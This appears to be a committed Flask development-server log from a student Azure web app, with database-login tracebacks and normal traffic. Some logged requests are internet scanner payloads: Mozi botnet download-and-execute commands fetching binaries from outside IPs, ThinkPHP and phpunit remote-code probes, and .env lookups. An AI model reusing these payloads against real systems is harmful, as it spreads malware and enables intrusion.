+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/_compat.py", line 33, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/udacityadmin/nd081-c1-provisioning-microsoft-azure-vms-project-starter-master/FlaskWebProject/views.py", line 67, in login
+    user = User.query.filter_by(username=form.username.data).first()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3287, in first
+    ret = list(self[0:1])
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3065, in __getitem__
+    return list(res)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3389, in __iter__
+    return self._execute_and_instances(context)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3411, in _execute_and_instances
+    querycontext, self._connection_from_session, close_with_result=True
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3426, in _get_bind_args
+    mapper=self._bind_mapper(), clause=querycontext.statement, **kw
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3404, in _connection_from_session
+    conn = self.session.connection(**kw)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1133, in connection
+    execution_options=execution_options,
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1139, in _connection_for_bind
+    engine, execution_options
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 432, in _connection_for_bind
+    conn = bind._contextual_connect()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2242, in _contextual_connect
+    self._wrap_pool_connect(self.pool.connect, None),
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2280, in _wrap_pool_connect
+    e, dialect, self
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 1547, in _handle_dbapi_exception_noconnection
+    util.raise_from_cause(sqlalchemy_exception, exc_info)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 398, in raise_from_cause
+    reraise(type(exception), exception, tb=exc_tb, cause=cause)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 152, in reraise
+    raise value.with_traceback(tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+sqlalchemy.exc.ProgrammingError: (pyodbc.ProgrammingError) ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+(Background on this error at: http://sqlalche.me/e/f405)
+127.0.0.1 - - [11/Nov/2020 04:06:33] "POST /login?next=%2F HTTP/1.1" 500 -
+127.0.0.1 - - [11/Nov/2020 04:06:37] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 04:06:38] "GET /static/scripts/bootstrap.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 04:14:05] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 05:57:41] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.77.108:59554/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 06:42:23] "GET /login.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 06:44:30] "GET /login.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 06:44:30] "GET /login.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 09:04:17] "GET /portal/redlion HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 10:01:20] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 10:01:38] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [11/Nov/2020 10:16:40] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 10:16:41] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:42] "GET /static/content/bootstrap.min.css HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:42] "GET /static/content/site.css HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:46] "GET /static/scripts/jquery-1.10.2.js HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:46] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:47] "GET /static/scripts/bootstrap.js HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:48] "GET /static/scripts/respond.js HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 10:16:52] "GET /static/images/sign-in-with-ms.svg HTTP/1.1" 200 -
+[2020-11-11 10:16:58,830] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+pyodbc.ProgrammingError: ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/_compat.py", line 33, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/udacityadmin/nd081-c1-provisioning-microsoft-azure-vms-project-starter-master/FlaskWebProject/views.py", line 67, in login
+    user = User.query.filter_by(username=form.username.data).first()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3287, in first
+    ret = list(self[0:1])
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3065, in __getitem__
+    return list(res)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3389, in __iter__
+    return self._execute_and_instances(context)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3411, in _execute_and_instances
+    querycontext, self._connection_from_session, close_with_result=True
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3426, in _get_bind_args
+    mapper=self._bind_mapper(), clause=querycontext.statement, **kw
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/query.py", line 3404, in _connection_from_session
+    conn = self.session.connection(**kw)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1133, in connection
+    execution_options=execution_options,
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 1139, in _connection_for_bind
+    engine, execution_options
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/orm/session.py", line 432, in _connection_for_bind
+    conn = bind._contextual_connect()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2242, in _contextual_connect
+    self._wrap_pool_connect(self.pool.connect, None),
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2280, in _wrap_pool_connect
+    e, dialect, self
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 1547, in _handle_dbapi_exception_noconnection
+    util.raise_from_cause(sqlalchemy_exception, exc_info)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 398, in raise_from_cause
+    reraise(type(exception), exception, tb=exc_tb, cause=cause)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 152, in reraise
+    raise value.with_traceback(tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/base.py", line 2276, in _wrap_pool_connect
+    return fn()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 363, in connect
+    return _ConnectionFairy._checkout(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 773, in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 492, in checkout
+    rec = pool._do_get()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 139, in _do_get
+    self._dec_overflow()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 68, in __exit__
+    compat.reraise(exc_type, exc_value, exc_tb)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/util/compat.py", line 153, in reraise
+    raise value
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/impl.py", line 136, in _do_get
+    return self._create_connection()
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 308, in _create_connection
+    return _ConnectionRecord(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 437, in __init__
+    self.__connect(first_connect_check=True)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/pool/base.py", line 652, in __connect
+    connection = pool._invoke_creator(self)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/strategies.py", line 114, in connect
+    return dialect.connect(*cargs, **cparams)
+  File "/home/udacityadmin/.local/lib/python3.6/site-packages/sqlalchemy/engine/default.py", line 489, in connect
+    return self.dbapi.connect(*cargs, **cparams)
+sqlalchemy.exc.ProgrammingError: (pyodbc.ProgrammingError) ('42000', '[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Cannot open database "hellowworlddb.database.windows.net" requested by the login. The login failed. (4060) (SQLDriverConnect)')
+(Background on this error at: http://sqlalche.me/e/f405)
+127.0.0.1 - - [11/Nov/2020 10:16:58] "POST /login?next=%2F HTTP/1.1" 500 -
+127.0.0.1 - - [11/Nov/2020 10:18:09] "GET /currentsetting.htm HTTP/1.1" 404 -
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [11/Nov/2020 13:10:54] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:10:55] "GET /home HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 13:12:05] "GET /logout HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:12:06] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 13:12:09] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:12:10] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 13:12:29] "GET /static/content/bootstrap.min.css HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:34] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:34] "GET /static/content/site.css HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:35] "GET /static/scripts/bootstrap.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:35] "GET /static/scripts/jquery-1.10.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:35] "GET /static/scripts/respond.js HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:12:40] "GET /static/images/sign-in-with-ms.svg HTTP/1.1" 304 -
+127.0.0.1 - - [11/Nov/2020 13:19:28] "GET /logout HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:19:28] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 13:23:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:24:00] "GET /new_post HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 13:24:00] "GET /login?next=%2Fnew_post HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 14:11:12] "GET /home HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 14:11:12] "GET /login?next=%2Fhome HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 14:31:36] "GET /home HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 14:31:36] "GET /login?next=%2Fhome HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 15:13:37] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:37] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 15:13:37] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:37] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:39] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:40] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:41] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:41] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:13:43] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 15:13:43] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 15:13:44] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 15:20:46] "GET /None HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 15:23:16] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 16:17:17] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 17:48:00] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 17:48:00] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 17:58:43] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 18:33:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 18:45:34] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 18:45:34] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 19:02:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 19:13:10] "GET /proxyjudge.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 19:45:08] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 20:11:06] "GET /0bef HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 20:20:46] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 20:20:46] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 20:32:35] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [11/Nov/2020 20:32:35] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [11/Nov/2020 20:55:21] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 20:55:53] "GET /hudson HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 21:26:55] "POST /images.php HTTP/1.1" 404 -
+127.0.0.1 - - [11/Nov/2020 21:58:05] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:11:06] "GET /TP/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:07] "GET /TP/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:07] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:07] "GET /html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:08] "GET /public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:08] "GET /TP/html/public/index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:09] "GET /elrekt.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:09] "GET /index.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 00:11:09] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:11:10] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 00:15:52] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:21:10] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:22:57] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:48:13] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 00:48:17] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 01:02:48] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 01:10:55] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 02:20:23] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 02:22:26] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 02:22:27] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 03:03:05] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 03:25:28] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 03:25:29] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 03:34:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.192.224.49:49477/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 03:42:07] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 04:20:34] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 05:41:48] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://113.237.158.203:19396/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 05:42:43] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 05:45:38] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 05:47:10] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 06:18:14] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:28:20] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:19] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:19] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 07:37:19] "GET /console/ HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:19] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%3Cphp%3Edie%28%2540md5%28HelloThinkCMF%29%29%3C%252Fphp%3E HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 07:37:20] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:20] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:20] "POST /api/jsonws/invoke HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:20] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:21] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:37:21] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 07:37:21] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+127.0.0.1 - - [12/Nov/2020 07:39:05] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 07:39:06] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [12/Nov/2020 08:07:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 08:07:12] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 08:13:07] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 09:01:45] "GET /currentsetting.htm HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 09:09:25] "GET /portal/redlion HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 11:02:43] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /index/index/register1/type/1.html HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /phpcms/modules/member/touzi.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /Public/home/appjs/Index.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /index2.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /lateron.asp HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /mmbh/login.php HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /js/guest.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /Public/app/js/cvphp.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /cloud-app/include/css/uncall.css HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /Application/Basic/Static/css/customerselect.css HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /web/api/getConfig?type=several&keys=www_app_base:downloadUrl1,www_app_base:downloadUrl4&accessToken=undefined HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:24] "GET /views/ucenter/ucenter.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Resource/webResource/js/newcheck.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /images2/bankCheck.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Template/Home/Run/record.html HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /index.php?g=Pay&m=Res&a=ispay HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/index.css HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /public/static/js/main.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Public/js/chatmsg.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /views/bank/bank.html HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /index3.php?m=Order&a=hetong&id=999999 HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/js/lang_json_cn.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Six/Js/class_12.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /static/pcweb/js/newcheck.js HTTP/1.1" 404 -
+127.0.0.1 - - [12/Nov/2020 12:29:25] "GET /Loan/SubmitLogin HTTP/1.1" 404 -
